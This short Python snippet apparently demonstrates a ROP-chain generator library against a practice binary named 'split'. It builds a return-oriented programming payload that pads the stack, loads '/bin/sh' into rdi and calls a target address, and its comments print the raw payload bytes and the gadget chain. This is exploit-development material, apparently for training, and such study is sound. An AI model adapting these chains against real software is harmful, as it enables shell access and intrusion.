from ropgen import ROP

r = ROP('files\\split')
r.initialize()

r.padding(40)

r.set_regs({"rdi": b"/bin/sh", "r14": 20, "r15": 25})
r.call(0x40074B)

print(r.generate())
# b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x00\x04\x00\x00\x00\x00\x00/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\x04\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00K\x07@\x00\x00\x00\x00\x00'

print(r.print_chain())
# rop_chain  = ''
# rop_chain += b'A' * 40 # padding
# rop_chain += pop_rdi(rdi = b'/bin/sh')
# rop_chain += pop_rbx_rbp_r12_r13_r14_r15(r14 =  0x0000014)
# rop_chain += pop_r15(r15 = 0x000019)
# rop_chain += qword(0x40074b)
